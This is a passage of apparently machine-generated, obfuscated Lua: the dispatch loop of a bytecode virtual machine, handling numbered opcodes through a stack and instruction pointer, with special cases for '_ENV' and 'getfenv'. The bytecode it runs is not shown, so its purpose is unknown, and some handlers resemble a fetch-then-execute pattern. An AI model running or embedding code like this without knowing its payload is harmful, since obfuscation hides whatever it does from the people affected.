                Inst = Instr[VIP];
                A = Inst[2];
                Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                Top = (Limit + A) - 1;
                Edx = 0;
                for Idx = A, Top do
                  Edx = Edx + 1;
                  Stk[Idx] = Results[Edx];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]]();
                VIP = VIP + 1;
                Inst = Instr[VIP];
                do
                  return;
                end
              end
            elseif (Enum <= 317) then
              if (Enum <= 314) then
                if (Enum <= 312) then
                  local Edx;
                  local Results, Limit;
                  local B;
                  local A;
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                  Top = (Limit + A) - 1;
                  Edx = 0;
                  for Idx = A, Top do
                    Edx = Edx + 1;
                    Stk[Idx] = Results[Edx];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]]();
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  do
                    return;
                  end
                elseif (Enum > 313) then
                  local B;
                  local A;
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                else
                  local B;
                  local A;
                  A = Inst[2];
                  Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                end
              elseif (Enum <= 315) then
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Inst[3]] = Inst[4];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Inst[3]] = Inst[4];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                do
                  return;
                end
              elseif (Enum == 316) then
                do
                  return;
                end
              else
                local Results;
                local Edx;
                local Results, Limit;
                local B;
                local A;
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A](Stk[A + 1]);
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Results, Limit = _R(Stk[A](Stk[A + 1]));
                Top = (Limit + A) - 1;
                Edx = 0;
                for Idx = A, Top do
                  Edx = Edx + 1;
                  Stk[Idx] = Results[Edx];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Results = {Stk[A](Unpack(Stk, A + 1, Top))};
                Edx = 0;
                for Idx = A, Inst[4] do
                  Edx = Edx + 1;
                  Stk[Idx] = Results[Edx];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                VIP = Inst[3];
              end
            elseif (Enum <= 320) then
              if (Enum <= 318) then
                Stk[Inst[2]] = Inst[3] ~= 0;
              elseif (Enum > 319) then
                local Results;
                local Edx;
                local Results, Limit;
                local B;
                local A;
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Results, Limit = _R(Stk[A](Stk[A + 1]));
                Top = (Limit + A) - 1;
                Edx = 0;
                for Idx = A, Top do
                  Edx = Edx + 1;
                  Stk[Idx] = Results[Edx];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Results = {Stk[A](Unpack(Stk, A + 1, Top))};
                Edx = 0;
                for Idx = A, Inst[4] do
                  Edx = Edx + 1;
                  Stk[Idx] = Results[Edx];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                VIP = Inst[3];
              else
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
              end
            elseif (Enum <= 322) then
              if (Enum == 321) then
                local A;
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                do
                  return;
                end
              else
                local B;
                local A;
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
              end
            elseif (Enum == 323) then
              local Edx;
              local Results, Limit;
              local B;
              local A;
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              B = Stk[Inst[3]];
              Stk[A + 1] = B;
              Stk[A] = B[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
              Top = (Limit + A) - 1;
              Edx = 0;
              for Idx = A, Top do
                Edx = Edx + 1;
                Stk[Idx] = Results[Edx];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]]();
              VIP = VIP + 1;
              Inst = Instr[VIP];
              do
                return;
              end
            else
              local A = Inst[2];
              do
                return Unpack(Stk, A, Top);
              end
            end
          elseif (Enum <= 336) then
            if (Enum <= 330) then
              if (Enum <= 327) then
                if (Enum <= 325) then
                  local B;
                  local A;
                  A = Inst[2];
                  Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                elseif (Enum > 326) then
                  local B;
                  local A;
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Env[Inst[3]] = Stk[Inst[2]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Env[Inst[3]] = Stk[Inst[2]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                else
                  local B;
                  local A;
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A](Unpack(Stk, A + 1, Inst[3]));
                end
              elseif (Enum <= 328) then
                local A = Inst[2];
                local T = Stk[A];
                for Idx = A + 1, Inst[3] do
                  Insert(T, Stk[Idx]);
                end
              elseif (Enum > 329) then
                local B;
                local A;
                A = Inst[2];
                Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Stk[Inst[4]]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
              else
                local Edx;
                local Results, Limit;
                local B;
                local A;
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                Top = (Limit + A) - 1;
                Edx = 0;
                for Idx = A, Top do
                  Edx = Edx + 1;
                  Stk[Idx] = Results[Edx];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]]();
                VIP = VIP + 1;
                Inst = Instr[VIP];
                do
                  return;
                end
              end
            elseif (Enum <= 333) then
              if (Enum <= 331) then
                local A;
                Stk[Inst[2]][Inst[3]] = Inst[4];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Inst[3]] = Inst[4];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Inst[3]] = Inst[4];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                do
                  return;
                end
              elseif (Enum == 332) then
                local B;
                local A;
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                do
                  return;
                end
              else
                local Edx;
                local Results, Limit;
                local B;
                local A;
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                Top = (Limit + A) - 1;
                Edx = 0;
                for Idx = A, Top do
                  Edx = Edx + 1;
                  Stk[Idx] = Results[Edx];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]]();
                VIP = VIP + 1;
                Inst = Instr[VIP];
                do
                  return;
                end
              end
            elseif (Enum <= 334) then
              local Edx;
              local Results, Limit;
              local B;
              local A;
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              B = Stk[Inst[3]];
              Stk[A + 1] = B;
              Stk[A] = B[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
              Top = (Limit + A) - 1;
              Edx = 0;
              for Idx = A, Top do
                Edx = Edx + 1;
                Stk[Idx] = Results[Edx];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]]();
              VIP = VIP + 1;
              Inst = Instr[VIP];
              do
                return;
              end
            elseif (Enum == 335) then
              local Edx;
              local Results, Limit;
              local B;
              local A;
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              B = Stk[Inst[3]];
              Stk[A + 1] = B;
              Stk[A] = B[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
              Top = (Limit + A) - 1;
              Edx = 0;
              for Idx = A, Top do
                Edx = Edx + 1;
                Stk[Idx] = Results[Edx];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]]();
              VIP = VIP + 1;
              Inst = Instr[VIP];
              do
                return;
              end
            else
              local B;
              local A;
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              B = Stk[Inst[3]];
              Stk[A + 1] = B;
              Stk[A] = B[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
              VIP = VIP + 1;
              Inst = Instr[VIP];
              if Stk[Inst[2]] then
                VIP = VIP + 1;
              else
                VIP = Inst[3];
              end
            end
          elseif (Enum <= 342) then
            if (Enum <= 339) then
              if (Enum <= 337) then
                local Edx;
                local Results, Limit;
                local B;
                local A;
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                Top = (Limit + A) - 1;
                Edx = 0;
                for Idx = A, Top do
                  Edx = Edx + 1;
                  Stk[Idx] = Results[Edx];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]]();
                VIP = VIP + 1;
                Inst = Instr[VIP];
                do
                  return;
                end
              elseif (Enum > 338) then
                local B;
                local A;
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                do
                  return;
                end
              else
                local Edx;
                local Results, Limit;
                local B;
                local A;
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                Top = (Limit + A) - 1;
                Edx = 0;
                for Idx = A, Top do
                  Edx = Edx + 1;
                  Stk[Idx] = Results[Edx];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]]();
                VIP = VIP + 1;
                Inst = Instr[VIP];
                do
                  return;
                end
              end
